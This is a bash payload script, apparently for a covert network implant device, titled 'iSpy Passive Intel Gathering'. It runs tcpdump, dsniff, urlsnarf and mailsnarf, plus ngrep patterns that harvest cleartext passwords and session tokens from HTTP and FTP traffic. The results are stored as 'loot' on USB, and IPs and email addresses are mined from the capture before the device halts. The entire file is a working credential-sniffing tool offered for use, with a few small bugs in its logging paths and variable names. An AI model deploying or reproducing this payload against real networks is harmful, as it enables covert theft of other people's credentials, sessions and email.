#!/bin/bash
#
# Title:		iSpy Passive Intel Gathering

# Description:		Launches various tools to sniff out intel data.
#			Payload will run until the button is pressed.

# Author: 		infoskirmish.com
# Version:		1.0
# Category:		sniffing
# Target: 		Any
# Net Mode:		Any (default: Transparent)

# LEDs
# SUCCESS:		Payload ended complete
# FAIL:			No USB storage found

lootPath="/mnt/loot/intel"			# Path to loot
mode="TRANSPARENT"				# Network mode we want to use
interface="lo"				# Interface to listen on
Date=$(date +%Y-%m-%d-%H%M)			# Date format to use for log files
dsnifflog="dsniff_$Date.log"			# DSNiff log file name
urlsnifflog="urlsnarf_$Date.log"		# URLSniff log file name
tcpdumplog="tcpdump_$Date.pcap"			# TCPDump log file name
httppwdlog="httpPasswords_$Date.pcap"		# Potential HTTP password file name
sessionidlog="sessionids_$Date.pcap"		# Potential Session IDs file name
mailsnarfLog="mailsnarf_$Date.log"		# Mailsnarf data log file path.

function monitor_space() {
	while true
	do
		[[ $(df | grep /mnt | awk '{print $4}') -lt 10000 ]] && {
			kill $1
			LED G SUCCESS
			sync
			break
		}
		sleep 5
	done
}

function finish() {

	# Kill URLSnarff
    echo "URLSnarff ending pid=$1" >> $1/log.txt
	kill $1
	wait $1

	# Kill DNSniff
    echo "DNSniff ending pid=$2" >> $2/log.txt
	kill $2
	wait $2

	# Kill TCPDump
    echo "TCPDump ending pid=$3" >> $3/log.txt
	kill $3
	wait $3

	# Kill HTTP Password NGREP
    echo "HTTP Password NGREP ending pid=$4" >> $4/log.txt
	kill $4
	wait $4

	# Kill Session NGREP
    echo "HTTP Session NGREP ending pid=$5" >> $5/log.txt
	kill $5
	wait $5
    
    # Kill Mail Snarf
    echo "Mail Snarf ending pid=$6" >> $6/log.txt
    kill $6
    wait $6

	# I found that if this payload had been running awhile the next two steps may take a bit. It is useful to have some kind of indication
	# that the payload accepted your button push and is responding. Thus the rapid white blink.
	LED W VERYFAST

	# Dump all unique IP address from TCP Dump file.
	tcpdump -qns 0 -X -r $lootPath/$tcpdumplog | grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" | sort | uniq >> $lootPath/ipv4found_$Date.txt

	# Ok this is a really stupid grep pattern matching to search for emails; it is meant to give an over view of what is possible.
	tcpdump -qns 0 -X -r $lootPath/$tcpdumplog | grep -Eiv "[\.]{2}" | grep -oE "\b[a-zA-Z0-9.-]+@[a-zA-Z0-9.-]+\.[a-zA-Z0-9.-]+\b" | sort | uniq >> $lootPath/maybeEmails_$Date.txt

	sync

	# Indicate successful shutdown
	LED R SUCCESS
	sleep 1

	# Halt the system; turn off LED
	LED OFF
	halt
}

function run() {

	# Create loot directory
	mkdir -p $lootPath &> /dev/null

	# Start tcpdump on the specified interface
	tcpdump -i $interface -w $lootPath/$tcpdumplog &>/dev/null &
	tpid=$!

	# Log TCP Dump Start
	echo "TCPDump started pid=$tpid" >> $lootPath/log.txt

	# Start urlsnarff on the specified interface
	urlsnarf -n -i $interface >> $lootPath/$urlsnifflog &
	urlid=$!

	# Log URL Snarff Start
	echo "URLSnarf started pid=$urlid" >> $lootPath/log.txt

	# Start dsniff on the specified interface
	dsniff -c -m -i $interface -w $lootPath/$dsnifflog &
	dsniffid=$!

	# Log DSNiff Start
	echo "DSNiff started pid=$dsniffid" >> $lootPath/log.txt

	# Log potential plain text user names and passwords on port 80 and 21
	# The thing is port 21 is the defult ftp port. Passwords and user names are exchanged in clear text!!!
	ngrep -d $interface -i "user_pass|userid|pass|pwd|password|login|user_login|usr|USER" -W byline port 80 or port 21 -O $lootPath/$httppwdlog &	
	pwdgrep=$!

	# Log Password NGREP Start
	echo "Password NGREP started pid=$pwdgrep" >> $lootPath/log.txt

	# Log potential plain text session ids, tokens, etc.
	ngrep -d $interface -i "session|sessid|token|loggedin|PHPSESSID|CFTOKEN|CFID|JSESSIONID|sessionid" -W byline port 80 or port 21 -O $lootPath/$sessionidlog &
	sessiongrep=$!

	# Log Session NGREP Start
	echo "Session NGREP started pid=$sessiongrep" >> $lootPath/log.txt

	# Log mailsnarf data
	mailsnarf -i $interface $lootPath/$mailsnarflog &
	mailsnarfid=$!

	# Log mailsnarf Start.
	echo "Mailsnarf started pid=$mailsnarfid" >> $lootPath/log.txt

	# Wait for button to be pressed (disable button LED)
	NO_LED=true BUTTON
	finish $urlid $dsniffid $tpid $pwdgrep $sessiongrep $mailsnarfid
}


# This payload will only run if we have USB storage
if [ -d "/mnt/loot" ]; then

    # Set networking to TRANSPARENT mode and wait five seconds
    NETMODE $mode >> $lootPath/log.txt
    sleep 5

    # Lets make sure the interface the user wanted actually exisits.
    if [[ $(ifconfig |grep $interface) ]]; then

	   echo "" > $lootPath/log.txt

	   LED ATTACK
	   run &
	   monitor_space $! &
       
    else

	   # Interface could not be found; log it in ~/payload/switch1/log.txt
       	   ifconfig > $lootPath/log.txt
	   echo "Could not load interface $interface. Stopping..." >> $lootPath/log.txt
       
	   # Display FAIL LED 
	   LED FAIL

    fi

else

	# USB storage could not be found; log it in ~/payload/switch1/log.txt
	echo "Could not load USB storage. Stopping..." > log.txt

	# Display FAIL LED 
	LED FAIL

fi
